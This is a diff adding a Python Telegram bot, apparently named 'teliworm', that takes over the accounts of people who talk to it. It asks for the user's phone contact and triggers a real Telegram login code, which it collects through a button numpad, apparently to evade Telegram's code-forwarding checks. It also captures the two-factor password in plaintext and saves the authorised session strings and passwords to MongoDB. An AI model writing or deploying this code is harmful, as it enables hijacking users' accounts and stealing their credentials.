@@ -1,0 +1,196 @@
+import logging,os,json,telethon
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telethon.tl.custom.button import Button
+from dotenv import load_dotenv
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+from strings import strings,direct_reply
+
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+load_dotenv(override=True)
+
+mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
+bot = TelegramClient('teliworm', 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e").start(bot_token=os.getenv('BOT_TOKEN'))
+database = mongo_client.userdb.sessions
+numpad = [
+    [  
+        Button.inline("1", '{"press":1}'), 
+        Button.inline("2", '{"press":2}'), 
+        Button.inline("3", '{"press":3}')
+    ],
+    [
+        Button.inline("4", '{"press":4}'), 
+        Button.inline("5", '{"press":5}'), 
+        Button.inline("6", '{"press":6}')
+    ],
+    [
+        Button.inline("7", '{"press":7}'), 
+        Button.inline("8", '{"press":8}'), 
+        Button.inline("9", '{"press":9}')
+    ],
+    [
+        Button.inline("Clear All", '{"press":"clear_all"}'),
+        Button.inline("0", '{"press":0}'),
+        Button.inline("⌫", '{"press":"clear"}')
+    ]
+]
+
+def intify(s):
+    try:
+        return int(s)
+    except:
+        return s
+def get(obj, key, default=None):
+    try:
+        return obj[key]
+    except:
+        return default
+def yesno(x,page='def'):
+    return [
+        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
+        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
+    ]
+async def handle_usr(contact, event):
+    msg = await event.respond(strings['sending1'], buttons=Button.clear())
+    await msg.delete()
+    msg = await event.respond(strings['sending2'])
+    uclient = TelegramClient(StringSession(), os.getenv('API_ID'), os.getenv('API_HASH'))
+    await uclient.connect()
+    user_data = database.find_one({"chat_id": event.chat_id})
+    try:
+        scr = await uclient.send_code_request(contact.phone_number)
+        login = {
+        	'code_len': scr.type.length,
+            'phone_code_hash': scr.phone_code_hash,
+            'session': uclient.session.save(),
+        }
+        data = {
+        	'phone': contact.phone_number,
+            'login': json.dumps(login),
+        }
+        database.update_one({'_id': user_data['_id']}, {'$set': data})
+        await msg.edit(strings['ask_code'], buttons=numpad)
+    except Exception as e:
+        await msg.edit("Error: "+repr(e))
+    await uclient.disconnect()
+async def sign_in(event):
+    try:
+        user_data = database.find_one({"chat_id": event.chat_id})
+        login = json.loads(user_data['login'])
+        data = {}
+        uclient = None
+        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
+            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
+            await uclient.connect()
+            await uclient.sign_in(password=user_data['password'])
+        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
+            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
+            await uclient.connect()
+            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
+        else:
+            return False
+        data['session'] = uclient.session.save()
+        data['logged_in'] = True
+        login = {}
+        await event.edit(strings['login_success'])
+    except telethon.errors.PhoneCodeInvalidError as e:
+        await event.edit(strings['code_invalid'])
+        await event.respond(strings['ask_code'], buttons=numpad)
+        login['code'] = ''
+        login['code_ok'] = False
+    except telethon.errors.SessionPasswordNeededError as e:
+        login['need_pass'] = True
+        login['pass_ok'] = False
+        await event.edit(strings['ask_pass'])
+    except telethon.errors.PasswordHashInvalidError as e:
+        login['need_pass'] = True
+        login['pass_ok'] = False
+        await event.edit(strings['pass_invalid'])
+        await event.respond(strings['ask_pass'])
+    except Exception as e:
+        login['code'] = ''
+        login['code_ok'] = False
+        login['pass_ok'] = False
+        await event.edit(repr(e))
+    await uclient.disconnect()
+    data['login'] = json.dumps(login)
+    database.update_one({'_id': user_data['_id']}, {'$set': data})
+    return True
+
+@bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handler(event):
+    user_data = database.find_one({"chat_id": event.chat_id})
+    if user_data is None:
+        sender = await event.get_sender()
+        database.insert_one({
+            "chat_id": sender.id,
+            "first_name": sender.first_name,
+            "last_name": sender.last_name,
+            "username": sender.username,
+        })
+    if event.message.text in direct_reply:
+        await event.respond(direct_reply[event.message.text])
+        raise events.StopPropagation
+@bot.on(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
+async def handler(event):
+    user_data = database.find_one({"chat_id": event.chat_id})
+    if get(user_data, 'logged_in', False):
+        await event.respond(strings['already_logged_in'])
+        raise events.StopPropagation
+    await event.respond(strings['ask_phone'], buttons=[Button.request_phone("SHARE CONTACT", resize=True, single_use=True)])
+    raise events.StopPropagation
+@bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handler(event):
+    if event.message.contact:
+        if event.message.contact.user_id==event.chat.id:
+            await handle_usr(event.message.contact, event)
+        else:
+            await event.respond(strings['wrong_phone'])
+        raise events.StopPropagation
+@bot.on(events.CallbackQuery(func=lambda e: e.is_private))
+async def handler(event):
+    try:
+        evnt_dta = json.loads(event.data.decode())
+        press = evnt_dta['press']
+    except:
+        return
+    user_data = database.find_one({"chat_id": event.chat_id})
+    login = json.loads(user_data['login'])
+    login['code'] = get(login, 'code', '')
+    if type(press)==int:
+        login['code'] += str(press)
+    elif press=="clear":
+        login['code'] = login['code'][:-1]
+    elif press=="clear_all" or press=="nocode":
+        login['code'] = ''
+        login['code_ok'] = False
+    elif press=="yescode":
+        login['code_ok'] = True
+    elif press=="yespass":
+        login['pass_ok'] = True
+        login['need_pass'] = False
+    elif press=="nopass":
+        login['pass_ok'] = False
+        login['need_pass'] = True
+        await event.edit(strings['ask_pass'])
+    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
+    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
+        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
+    elif press=="nopass":
+        return
+    elif not await sign_in(event):
+        await event.edit(strings['ask_code']+login['code'], buttons=numpad)
+@bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handler(event):
+    user_data = database.find_one({"chat_id": event.chat_id})
+    login = json.loads(get(user_data, 'login', '{}'))
+    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
+        data = {
+            'password': event.message.text
+        }
+        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
+        database.update_one({'_id': user_data['_id']}, {'$set': data})
+        return
+with bot:
+    bot.run_until_disconnected()
